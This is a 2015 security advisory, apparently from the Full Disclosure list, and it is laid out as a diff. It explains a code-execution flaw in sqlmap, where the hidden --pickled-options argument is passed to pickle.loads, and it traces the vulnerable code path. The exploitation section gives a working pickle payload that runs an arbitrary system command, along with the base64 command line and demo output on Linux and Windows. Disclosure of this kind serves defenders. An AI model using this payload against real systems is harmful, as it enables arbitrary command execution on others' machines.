@@ -1,0 +1,354 @@
+
+Date: Wed, 9 Dec 2015 04:39:48 -0800
+From: Vex Woo <hap.ddup@...il.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] SQLMap Code Execute
+
+Sqlmap Code Execute
+
+
+Team:   Knownsec Team
+Site:   http://www.knownsec.com/
+
+
+--[ Contents
+]----------------------------------------------------------------
+
+1 - Summary
+    1.1 Background
+    1.2 Demo Platforms
+
+2 - Analysis
+    2.1 vulnerable code
+    2.2 How can we exploit it ?
+
+3 - Exploitation
+    3.1 Demo details
+
+4 - Conclusion
+
+5 - Refs
+
+--[ 1 - Summary
+]-------------------------------------------------------------
+
+1.1 Background
+
+    Sqlmap is an open source penetration testing tool that automates the
+process
+    of detecting and exploiting SQL injection flaws and taking over of
+database
+    servers. It comes with a powerful detection engine, many niche features
+for
+    the ultimate penetration tester and a broad range of switches lasting
+from
+    database fingerprinting, over data fetching from the database, to
+accessing
+    the underlying file system and executing commands on the operating
+system via
+    out-of-band connections.
+
+    During a code review, we discovered code execute bugs.
+
+
+1.2 Demo Platforms:
+1. Python 2.7.9 + Linux core 3.18.2-2-ARCH  x86_64 GNU/Linux
+2. Python 2.7.8 + Microsoft Windows 6.1.7601 Service Pack 1 Build 7601
+
+
+--[ 2 - Analysis
+]-------------------------------------------------------------
+
+2.1 vulnerable code
+
+    From "https://docs.python.org/2/library/pickle.html", we are warned,
+
+---[[[
+The pickle module is not intended to be secure against erroneous or
+maliciously constructed data. Never unpickle data received from an
+untrusted
+or unauthenticated source.
+]]]---
+
+
+    The vulnerable functions [pickle.load] and [pickle.loads], are placed
+in,
+
+[nixawk@...e sectools]$ grep --color -n -R 'pickle.load' ./sqlmap/
+./sqlmap/thirdparty/bottle/bottle.py:2209:            return
+pickle.loads(base64.b64decode(msg))
+./sqlmap/lib/core/bigarray.py:79:                    self.chunks[-1] =
+pickle.load(fp)
+./sqlmap/lib/core/bigarray.py:112:                    self.cache =
+Cache(index, pickle.load(fp), False)
+./sqlmap/lib/core/convert.py:70:        retVal =
+pickle.loads(base64decode(value))
+./sqlmap/lib/core/convert.py:72:        retVal =
+pickle.loads(base64decode(bytes(value)))
+
+
+    Now, we treat pickle.loads as a analysis target. function
+base64unpickle is from (./sqlmap/lib/core/convert.py:70)
+
+59 def base64unpickle(value):
+
+
+60     """
+
+
+61     Decodes value from Base64 to plain format and deserializes (with
+pickle) its content
+
+62
+
+
+63     >>> base64unpickle('gAJVBmZvb2JhcnEALg==')
+
+
+64     'foobar'
+
+
+65     """
+
+
+66
+
+
+67     retVal = None
+
+
+68
+
+
+69     try:
+
+
+70         retVal = pickle.loads(base64decode(value))
+
+
+71     except TypeError:
+
+
+72         retVal = pickle.loads(base64decode(bytes(value)))
+
+
+73
+
+
+74     return retVal
+
+
+2.2 How can we exploit it ?
+
+    After review the sqlmap code, wo know that,
+    1. sqlmap cmdline args will be captured by [sqlmap.py] first,
+    2. cmdLineParser in main function (sqlmap.py) will parses the command
+line parameters.
+    3. cmdLineParser is imported from (./lib/parse/cmdline.py), and it will
+successfully return [args].
+    4. Next, [args] will be used by _mergeOptions (./lib/core/option.py)
+
+
+                        -------------------------
+    [SQLMAP AGRS] ----> |       sqlmap.py        |
+---------------------------------------------------
+                        -------------------------|------ > |
+cmdLineOptions.update(cmdLineParser().__dict__) |
+          |             |
+---------------------------------------------------
+                                   |             |------ > |
+initOption(cmdLineOption)                       |
+  |           ---------------------------------------------------
+                                   ↓
+--------------------------
+| ./lib/parse/cmdline.py |
+-----------------------------------------------------------------
+-------------------------------- > | parser.add_option("--pickled-options",
+dest="pickledOptions", |
+                                   |
+-----------------------------------------------------------------
+                                   |
+  |
+                                   ↓
+                -------------------------
+| ./lib/core/option.py  |
+---------------------------------------------------------------------
+------------------------------- > | def
+initOptions(inputOptions=AttribDict(), overrideOptions=False) |
+          |                       |     ....
+                           |
+  |             |     _mergeOptions(inputOptions, overrideOptions)
+         |
+                                   |
+---------------------------------------------------------------------
+  |                                             |
+  |           |
+  |   |
+  |   |
+  |
+------------------------------------------------------------------
+  |     | def _mergeOptions(inputOptions, overrideOptions):              |
+  |     |     inputOptions = base64unpickle(inputOptions.pickledOptions) |
+  |     ------------------------------------------------------------------
+  |
+  |
+  |
+                                   |
+  ↓
+                -------------------------
+| ./lib/core/convert.py |
+------------------------------------------------------------------
+------------------------------- >   | def base64unpickle(value):
+                         |
+                                    |     ....
+                         |
+                                    |     try:
+                         |           -----------------
+    |         retVal = pickle.loads(base64decode(value))            |
+--------- | ^.^ BINGO !!! |
+    |     ....                                                      |
+    -----------------
+    -----------------------------------------------------------------
+
+
+    What's the matter ? Where is the bug ?
+    Yeah, bug is there. command parameters is the root of evil.
+
+
+    ------------------- ./lib/core/option.py ------------------
+1960 def _mergeOptions(inputOptions, overrideOptions):
+
+
+1961     """
+
+
+1962     Merge command line options with configuration file and default
+options.
+
+1963
+
+
+1964     @param inputOptions: optparse object with command line options.
+
+
+1965     @type inputOptions: C{instance}
+
+
+1966     """
+
+
+1967
+
+
+1968     if inputOptions.pickledOptions:
+
+
+1969         inputOptions = base64unpickle(inputOptions.pickledOptions)
+
+
+    ------------------- ./lib/parse/cmdline.py ------------------
+722         # Hidden and/or experimental options
+
+
+723         parser.add_option("--dummy", dest="dummy", action="store_true",
+
+
+724                           help=SUPPRESS_HELP)
+
+
+725
+
+
+726         parser.add_option("--pickled-options", dest="pickledOptions",
+
+
+727                           help=SUPPRESS_HELP)
+
+
+
+--[ 3 - Exploitation
+]-------------------------------------------------------------
+
+    3.1 Demo details:
+
+        Attention here:
+   our payload is "cos\nsystem\n(S'uname -a'\ntR.",
+   Anybody can replace "uname -a " with commands which is supported
+   by your environment.
+
+For examples,
+
+        -------- Arch Linux ---------------
+[nixawk@...e tmp]$ python
+Python 2.7.9 (default, Dec 11 2014, 04:42:00)
+[GCC 4.9.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> data = "cos\nsystem\n(S'uname -a'\ntR."
+>>> import pickle
+>>> pickle.loads(data)
+Linux core 3.18.2-2-ARCH #1 SMP PREEMPT Fri Jan 9 07:37:51 CET 2015 x86_64
+GNU/Linux
+0
+>>>
+
+
+        -------- Windows 7 ----------------
+C:\Users\nixawk>python
+Python 2.7.8 (default, Jun 30 2014, 16:03:49) [MSC v.1500 32 bit (Intel)]
+on win32
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import pickle
+>>> data = "cos\nsystem\n(S'whoami'\ntR."
+>>> pickle.loads(data)
+knownsec\nixawk
+0
+>>>
+
+[nixawk@...e sqlmap]$ python sqlmap.py --pickled-options
+"Y29zCnN5c3RlbQooUyd1bmFtZSAtYScKdFIu"
+Linux core 3.18.2-2-ARCH #1 SMP PREEMPT Fri Jan 9 07:37:51 CET 2015 x86_64
+GNU/Linux
+
+[10:17:17] [CRITICAL] unhandled exception occurred in
+sqlmap/1.0-dev-7388c3b. It is recommended to retry your run with the latest
+development version from official GitHub repository at '
+https://github.com/sqlmapproject/sqlmap'. If the exception persists, please
+open a new issue at 'https://github.com/sqlmapproject/sqlmap/issues/new'
+with the following text and any other information required to reproduce the
+bug. The developers will try to reproduce the bug, fix it accordingly and
+get back to you
+sqlmap version: 1.0-dev-7388c3b
+Python version: 2.7.9
+Operating system: posix
+Command line: sqlmap.py --pickled-options
+Y29zCnN5c3RlbQooUyd1bmFtZSAtYScKdFIu
+Technique: None
+Back-end DBMS: None (identified)
+Traceback (most recent call last):
+ File "sqlmap.py", line 78, in main
+   initOptions(cmdLineOptions)
+ File "lib/core/option.py", line 2341, in initOptions
+   _mergeOptions(inputOptions, overrideOptions)
+ File "lib/core/option.py", line 1971, in _mergeOptions
+   if inputOptions.configFile:
+AttributeError: 'int' object has no attribute 'configFile'
+
+do you want to automatically create a new (anonymized) issue with the
+unhandled exception information at the official Github repository? [y/N] >
+
+--[ 4 - Conclusion
+]-------------------------------------------------------------
+The place where sqlmap can be accessed is our target.
+
+
+--[ 5 - Refs ]-------------------------------------------------------------
+
+https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf
+https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf
+https://docs.python.org/2/library/pickle.html
+https://blog.nelhage.com/2011/03/exploiting-pickle/
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
